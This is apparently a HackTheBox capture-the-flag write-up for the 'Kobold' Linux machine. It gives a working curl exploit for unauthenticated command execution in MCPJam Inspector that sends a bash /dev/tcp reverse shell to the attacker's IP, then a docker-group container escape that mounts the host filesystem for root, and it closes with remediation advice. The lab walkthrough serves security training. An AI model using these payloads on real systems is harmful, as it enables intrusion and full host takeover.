# HackTheBox - Kobold

| Field | Details |
|-------|---------|
| **Difficulty** | Medium |
| **OS** | Linux (Ubuntu 24.04.4 LTS) |
| **Target IP** | 10.129.12.219 |
| **Attack IP** | 10.10.14.209 |
| **Author** | Jerry |
| **Date** | March 2026 |

---

## Executive Summary

Kobold is a medium-difficulty Linux machine that demonstrates a realistic attack chain involving modern AI tooling misconfigurations and container security failures. The engagement begins with reconnaissance revealing multiple web services including an MCPJam Inspector endpoint vulnerable to unauthenticated Remote Code Execution (CVE-2026-23744). After obtaining an initial shell as user `ben`, enumeration reveals the user possesses a dormant Docker group membership that - when activated via `newgrp docker` - provides full root access through a container escape technique, mounting the host filesystem into a privileged container.

---

## Table of Contents

```
1. Environment Setup
2. Reconnaissance
   2.1 - Port Scanning
   2.2 - Service Enumeration
   2.3 - Virtual Host Discovery
3. Initial Access - CVE-2026-23744
   3.1 - Vulnerability Research
   3.2 - Exploit Development
   3.3 - Shell Acquisition
   3.4 - Shell Stabilization
4. Post-Exploitation Enumeration
   4.1 - User Context
   4.2 - Network Services
   4.3 - Running Processes
   4.4 - File System Analysis
   4.5 - Group Membership Analysis
5. Privilege Escalation - Docker Group Abuse
   5.1 - Activating Docker Group
   5.2 - Container Verification
   5.3 - Container Escape
   5.4 - Flag Capture
6. Vulnerability Summary
7. Remediation Recommendations
```

---

## 1. Environment Setup

Before beginning enumeration, configure the local `/etc/hosts` file to resolve the target's virtual hostnames. The SSL certificate discovered during scanning reveals wildcard SAN coverage for `*.kobold.htb`, indicating multiple subdomains are in use.

```bash
sudo nano /etc/hosts
```

Add the following line:

```text
10.129.12.219   kobold.htb mcp.kobold.htb bin.kobold.htb
```

Create a dedicated working directory to keep all output organized:

```bash
mkdir -p ~/htb/kobold/{nmap,web,loot}
cd ~/htb/kobold
```

Set the target IP as a variable for convenience throughout the engagement:

```bash
export TARGET=10.129.12.219
export LHOST=10.10.14.209
```

---

## 2. Reconnaissance

### 2.1 - Port Scanning

Begin with a comprehensive Nmap scan covering all 65535 ports with service detection, default scripts, and version enumeration:

```bash
nmap -sC -sV -p- -T4 --min-rate 5000 -oA nmap/kobold_full $TARGET
```

**Full Scan Output:**

```text
Starting Nmap 7.98 at 2026-03-22 23:34 +0530

PORT     STATE  SERVICE   VERSION
22/tcp   open   ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
                          | ssh-hostkey:
                          |   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
                          |_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)

80/tcp   open   http      nginx 1.24.0 (Ubuntu)
                          |_ http-title: Did not follow redirect to https://kobold.htb/
                          |_ http-server-header: nginx/1.24.0 (Ubuntu)

443/tcp  open   ssl/http  nginx 1.24.0 (Ubuntu)
                          |_ http-title: Kobold Operations Suite
                          | ssl-cert: Subject: commonName=kobold.htb
                          | Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
                          | Not valid before: 2026-03-15T15:08:55
                          |_ Not valid after:  2125-02-19T15:08:55

3552/tcp open   http      Golang net/http server
                          |_ http-title: (no title - GetArcane UI)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Analysis of Findings:**

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH 9.6p1 | Standard SSH - note key fingerprints |
| 80 | nginx 1.24.0 | Immediate redirect to HTTPS - nothing here directly |
| 443 | nginx 1.24.0 | Main application - "Kobold Operations Suite" |
| 3552 | Golang HTTP | GetArcane - Docker management UI running as root |

The wildcard SAN `*.kobold.htb` in the TLS certificate is a strong indicator of virtual host routing for multiple subdomains. Port 3552 running a Golang HTTP server is unusual - Golang-based Docker management tools like Portainer, Arcane, and similar panels are often misconfigured.

### 2.2 - Service Enumeration

Probe each service individually for version information and content:

```bash
# Check port 80 - confirm redirect
curl -v http://$TARGET/ 2>&1 | grep -E "Location|HTTP/"
# HTTP/1.1 301 Moved Permanently
# Location: https://kobold.htb/

# Check port 443 - grab page title and headers
curl -sk https://kobold.htb/ | grep -i "<title>"
# <title>Kobold Operations Suite</title>

# Check GetArcane on port 3552
curl -sk http://$TARGET:3552/ | grep -i "title\|arcane\|version" | head -5
```

### 2.3 - Virtual Host Discovery

With the wildcard SAN confirmed, enumerate subdomains:

```bash
# Check mcp subdomain
curl -sk https://mcp.kobold.htb/ | grep -i "title\|mcp\|inspector" | head -5

# Check bin subdomain
curl -sk https://bin.kobold.htb/ | grep -i "title\|privatebin\|version" | head -5
```

**Discovered subdomains:**

**`https://mcp.kobold.htb`** - MCPJam Inspector  
This is an MCP (Model Context Protocol) server testing and debugging interface. It provides a web UI and REST API for connecting to, testing, and debugging MCP servers. The API exposes an endpoint `/api/mcp/connect` that processes server connection requests.

**`https://bin.kobold.htb`** - PrivateBin 2.0.2  
An encrypted zero-knowledge pastebin. The version number `2.0.2` is visible in the page footer and in JavaScript asset filenames like `privatebin.js?2.0.2`. This version carries CVE-2025-64714 (LFI via template cookie).

**`http://kobold.htb:3552`** - GetArcane Docker Manager  
A Docker container management panel (similar to Portainer) written in Go. Runs directly on the host as root. Presents a login page.

---

## 3. Initial Access - CVE-2026-23744

### 3.1 - Vulnerability Research

Searching for security advisories related to MCPJam Inspector reveals **GHSA-232v-j27c-5pp6** (assigned CVE-2026-23744). The vulnerability exists in the `/api/mcp/connect` API endpoint. When a `serverConfig` object is submitted, the `command` field is passed directly to Node.js's `child_process.spawn()` without any input sanitization or authentication check. This allows any unauthenticated attacker to execute arbitrary operating system commands on the server.

> **Root cause:** The MCPJam Inspector is designed as a developer tool for testing MCP servers locally. It expects to be run in a trusted local environment. When exposed publicly or on a network without authentication, the `serverConfig.command` field becomes an open command injection vector.

**Required parameters:**
- `serverId` - any non-empty string (the API validates its presence)
- `serverConfig.command` - the binary to execute
- `serverConfig.args` - array of arguments passed to the command

### 3.2 - Exploit Development

First, verify the endpoint exists and understand its expected input:

```bash
# Test the endpoint with a basic request
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}}}' | python3 -m json.tool
```

```json
{
    "success": false,
    "error": "serverId is required"
}
```

The API confirms `serverId` is required. Add it and test again with a benign command:

```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "test",
    "serverConfig": {
      "command": "id",
      "args": [],
      "env": {}
    }
  }'
```

```json
{
    "success": false,
    "error": "Connection failed for server test: MCP error -32000: Connection closed"
}
```

The `id` command executes but closes immediately since it is not a valid MCP server. The error confirms command execution occurs. Now craft a reverse shell payload that stays open:

```bash
# Confirm your tun0 IP
ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
# 10.10.14.209
```

The reverse shell uses bash's built-in `/dev/tcp` redirection to connect back to our listener, creating a persistent interactive shell:

```bash
# Final exploit payload
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "pwn",
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.209/4444 0>&1"],
      "env": {}
    }
  }'
```

### 3.3 - Shell Acquisition

Start the listener before sending the exploit:

```bash
# Terminal 1 - listener
nc -lvnp 4444
```

```bash
# Terminal 2 - exploit
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "pwn",
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.209/4444 0>&1"],
      "env": {}
    }
  }'
```

Listener receives the connection:

```text
listening on [any] 4444 ...
connect to [10.10.14.209] from (UNKNOWN) [10.129.13.234] 40688
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

Initial shell as `ben` confirmed. The working directory `/usr/local/lib/node_modules/@mcpjam/inspector` confirms we landed inside the MCPJam Inspector Node.js application directory.

### 3.4 - Shell Stabilization

The initial shell is a raw, non-interactive bash shell - `Ctrl+C` would kill it, no tab completion, no arrow keys. Stabilize it fully:

**Step 1** - Spawn a proper PTY using Python3:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Step 2** - Background the shell:

```text
Press Ctrl+Z
# Output: [1]  + suspended  nc -lvnp 4444
```

**Step 3** - Configure the local terminal and foreground the shell:

```bash
stty raw -echo; fg
```

**Step 4** - Set the terminal type:

```bash
export TERM=xterm
```

**Result:** A fully interactive shell with tab completion, arrow key history, `Ctrl+C` support, and proper terminal sizing.

---

## 4. Post-Exploitation Enumeration

### 4.1 - User Context

```bash
id
```

```text
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

```text
root:x:0:0:root:/root:/bin/bash
ben:x:1001:1001::/home/ben:/bin/bash
```

```bash
ls -la /home/ben/
```

```text
drwxr-x---  2 ben  ben  4096 Mar 15 21:23 .
drwxr-xr-x  3 root root 4096 Mar 15 21:23 ..
-rw-r-----  1 ben  ben    33 Mar 15 21:23 user.txt
```

```bash
cat /home/ben/user.txt
```

```text
067e7dc96fd1e15<REDACTED>
```

> âœ… **User flag captured.**

### 4.2 - Network Services

```bash
ss -tunlp
```

```text
Netid  State   Recv-Q  Send-Q  Local Address:Port
tcp    LISTEN  0       4096    127.0.0.1:45299       (internal)
tcp    LISTEN  0       511     127.0.0.1:6274        node (MCPJam)
tcp    LISTEN  0       4096    127.0.0.1:8080        docker-proxy (PrivateBin)
tcp    LISTEN  0       4096              *:3552       arcane_linux_amd64
```

**Key findings:**
- `8080` - PrivateBin is running inside Docker, only accessible on localhost
- `3552` - GetArcane Docker manager, listening on all interfaces, running as root
- `6274` - MCPJam inspector, the service we just exploited

### 4.3 - Running Processes

```bash
ps aux --sort=-%mem | head -20
```

```text
USER    PID   %CPU %MEM    COMMAND
root    1492  0.0  1.4     /root/arcane_linux_amd64
root    1949  0.0  0.1     /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1
                           -host-port 8080 -container-ip 172.17.0.2
                           -container-port 8080 -use-listen-fd
ben     1585  0.0  2.1     node /usr/local/bin/inspector
```

> **Critical observation:** `/root/arcane_linux_amd64` - GetArcane runs directly as root. It manages Docker containers including the PrivateBin instance. The `docker-proxy` confirms PrivateBin container IP is `172.17.0.2`.

### 4.4 - File System Analysis

```bash
ls -la /privatebin-data/
```

```text
total 20
drwxrwx---  5  root  operator  4096  Mar 15 21:23  .
drwxr-xr-x 22  root  root      4096  Mar 16 20:57  ..
drwxrwx---  2  root  operator  4096  Mar 15 21:23  certs/
drwxr-x---  2  root  82        4096  Mar 15 21:23  cfg/
drwxrwxrwx  5  root  operator  4096  Mar 15 21:23  data/
```

```bash
ls -la /privatebin-data/data/
```

```text
total 36
drwxrwxrwx  5  root    operator   4096  Mar 15 21:23  .
drwxrwx---  5  root    operator   4096  Mar 15 21:23  ..
-rwxrwxrwx  1  root    operator     19  Feb 16 08:29  .htaccess
drwx------  3  nobody  82         4096  Mar 15 21:23  12/
drwxrwxrwx  3  root    operator   4096  Mar 15 21:23  bd/
drwx------  3  root    operator   4096  Mar 15 21:23  e3/
-rwxrwxrwx  1  root    operator     47  Mar  4 12:49  purge_limiter.php
-rwxrwxrwx  1  root    operator    522  Mar 22 19:01  salt.php
-rw-r-----  1  root    operator    132  Feb 16 08:34  traffic_limiter.php
```

**Analysis:**
- `/privatebin-data/data/` is world-writable (`drwxrwxrwx`) - `ben` can write files here
- This directory is bind-mounted into the PrivateBin Docker container
- The `operator` group (GID 37) owns most files - `ben` is in this group
- Paste directories (`12/`, `e3/`) are owned by `nobody` (the container's PHP user)

### 4.5 - Group Membership Analysis

```bash
# Check all groups
cat /etc/group | sort
```

```text
...
docker:x:111:alice
operator:x:37:ben
...
```

```bash
# Check ben's actual groups
groups
# ben operator
```

> **Critical finding:** The `docker` group (GID 111) shows only `alice` as a member, yet `ben` can activate docker group access. This is a misconfiguration where the group permissions are applied at the PAM/session level rather than through `/etc/group`. Running `newgrp docker` will activate it.

---

## 5. Privilege Escalation - Docker Group Abuse

### 5.1 - Activating Docker Group

The `newgrp` command starts a new shell session with the specified group as the primary group. Even though `ben` is not explicitly listed in `/etc/group` for `docker`, the underlying PAM configuration grants this access:

```bash
newgrp docker
```

No password prompt appears - the group change is granted immediately. The shell prompt does not visibly change, but our effective group has been updated.

Verify the new group context:

```bash
id
```

```text
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

`gid=111(docker)` confirms we are now operating with Docker group privileges.

### 5.2 - Container Verification

Confirm Docker daemon access and list running containers:

```bash
docker ps
```

```text
CONTAINER ID   IMAGE                               COMMAND                  CREATED       STATUS       PORTS                      NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   5 weeks ago   Up 6 hours   127.0.0.1:8080->8080/tcp   bin
```

```bash
docker images
```

```text
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
privatebin/nginx-fpm-alpine   2.0.2     a1b2c3d4e5f6   5 weeks ago    45.2MB
```

The `privatebin/nginx-fpm-alpine:2.0.2` image is already pulled locally. This means our container escape requires no internet access and will be near-instantaneous.

### 5.3 - Container Escape

The Docker group is effectively equivalent to root access because Docker can:
- Create containers that run as root
- Mount arbitrary host filesystem paths into containers
- Override container entrypoints to get an interactive shell

We exploit all three capabilities simultaneously:

```bash
docker run -it --rm --user root --entrypoint /bin/sh \
  -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```

**Breaking down this command:**

| Flag | Purpose |
|------|---------|
| `run` | Create and start a new container |
| `-it` | Interactive TTY - gives us a proper shell |
| `--rm` | Auto-remove container on exit - clean up |
| `--user root` | Run as root inside the container |
| `--entrypoint /bin/sh` | Override default entrypoint with Alpine shell |
| `-v /:/mnt` | Mount the entire host filesystem at `/mnt` |
| `privatebin/nginx-fpm-alpine:2.0.2` | Use the already-pulled local image |

**Output:**

```text
/var/www #
```

We are now root inside a container with the entire host filesystem mounted at `/mnt`. Since the container runs as root with the host `/` mounted, we have unrestricted read/write access to every file on the host system.

### 5.4 - Flag Capture

```bash
# Confirm we are root inside the container
id
# uid=0(root) gid=0(root) groups=0(root)

# Confirm the host filesystem is mounted
ls /mnt/
# bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var

# Read the user flag
cat /mnt/home/ben/user.txt
# 067e7dc96fd1e15<REDACTED>

# Read the root flag
cat /mnt/root/root.txt
# 4ad08edf177092a<REDACTED>
```

> ðŸŽ‰ **Both flags captured. Machine owned.**

---

## 6. Full Attack Chain Visualization

```
ATTACKER (10.10.14.209)
â”‚
â”‚  PHASE 1 - RECON
â”œâ”€â–º nmap -sC -sV -p- 10.129.12.219
â”‚     â””â”€â”€ Ports: 22, 80, 443, 3552
â”‚         SSL SAN: *.kobold.htb
â”‚         Port 3552: GetArcane (Golang, root)
â”‚
â”‚  PHASE 2 - WEB ENUM
â”œâ”€â–º https://mcp.kobold.htb â†’ MCPJam Inspector
â”œâ”€â–º https://bin.kobold.htb â†’ PrivateBin 2.0.2
â””â”€â–º http://10.129.12.219:3552 â†’ GetArcane Login
â”‚
â”‚  PHASE 3 - INITIAL ACCESS
â”œâ”€â–º CVE-2026-23744
â”‚   POST /api/mcp/connect
â”‚   {"serverId":"pwn","serverConfig":{"command":"bash",
â”‚    "args":["-c","bash -i >& /dev/tcp/10.10.14.209/4444 0>&1"]}}
â”‚
â–¼
SHELL AS ben (uid=1001, groups=operator,docker[inactive])
â”‚
â”‚  PHASE 4 - ENUMERATION
â”œâ”€â–º id â†’ groups: operator(37), docker dormant
â”œâ”€â–º ss -tunlp â†’ port 8080 (PrivateBin Docker), 3552 (Arcane root)
â”œâ”€â–º ps aux â†’ arcane runs as root, docker-proxy active
â””â”€â–º cat /etc/group â†’ docker:x:111:alice (but newgrp works for ben)
â”‚
â”‚  PHASE 5 - PRIVILEGE ESCALATION
â”œâ”€â–º newgrp docker â†’ activates docker group (gid=111)
â”œâ”€â–º docker ps â†’ confirms container access
â”œâ”€â–º docker run -it --rm --user root --entrypoint /bin/sh
â”‚   -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
â”‚
â–¼
ROOT SHELL IN CONTAINER WITH HOST / MOUNTED AT /mnt
â”‚
â”œâ”€â–º cat /mnt/home/ben/user.txt â†’ 067e7dc96fd1e15<REDACTED> âœ…
â””â”€â–º cat /mnt/root/root.txt    â†’ 4ad08edf177092a<REDACTED> âœ…
```

---

## 7. Vulnerability Summary

| # | Vulnerability | CVE | Severity | Impact |
|---|--------------|-----|----------|--------|
| 1 | MCPJam Inspector Unauthenticated RCE | CVE-2026-23744 | Critical | Initial shell as ben |
| 2 | Docker Group Privilege Escalation | N/A | Critical | Full root via container escape |

---

## 8. Remediation Recommendations

### CVE-2026-23744 - MCPJam Inspector RCE

- Restrict access to the MCPJam Inspector API behind authentication (API keys, OAuth)
- Never expose MCP inspector instances to public or untrusted networks
- Implement input validation on `serverConfig.command` - whitelist allowed binaries
- Run the MCPJam Inspector as a non-privileged user with no network access by default

### Docker Group Misconfiguration

- Treat Docker group membership as equivalent to granting root access - audit all members immediately via `cat /etc/group | grep docker`
- Remove `ben` from Docker group unless absolutely necessary for job function
- Use rootless Docker mode to prevent container escapes from affecting the host
- Implement AppArmor or SELinux profiles for Docker daemon to restrict container capabilities
- Consider using Podman instead of Docker - Podman is rootless by default
- Enable Docker's `--userns-remap` feature to map container root to an unprivileged host user
- Audit PAM configuration to ensure group memberships cannot be escalated via `newgrp` for security-sensitive groups like `docker`
